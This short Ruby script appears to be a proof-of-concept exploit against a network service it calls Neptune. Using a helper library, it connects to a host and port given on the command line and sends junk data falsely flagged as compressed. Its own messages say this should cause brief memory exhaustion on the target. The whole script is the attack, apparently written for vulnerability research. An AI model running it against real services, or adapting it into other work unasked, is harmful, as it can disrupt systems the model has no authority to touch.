# Encoding: ASCII-8BIT

require 'base64'
require 'pp'

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> [port]"
  puts
  puts "Eg:"
  puts
  puts "ruby #{ $0 } 10.0.0.198 31438"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || "31438"

# Connect to the target
connection = LibNeptune::new(HOST, PORT)

# Send a message with compression on
# (it doesn't matter what the contents are, it's gonna be illegal)
$stderr.puts "Sending a compressed message"
connection.send_recv(
  body_override: 'This is some trash data',
  claim_compression: true,
)

$stderr.puts "Sent a message that should cause brief memory exhaustion.. you'll probably need to use a debugger to see it"
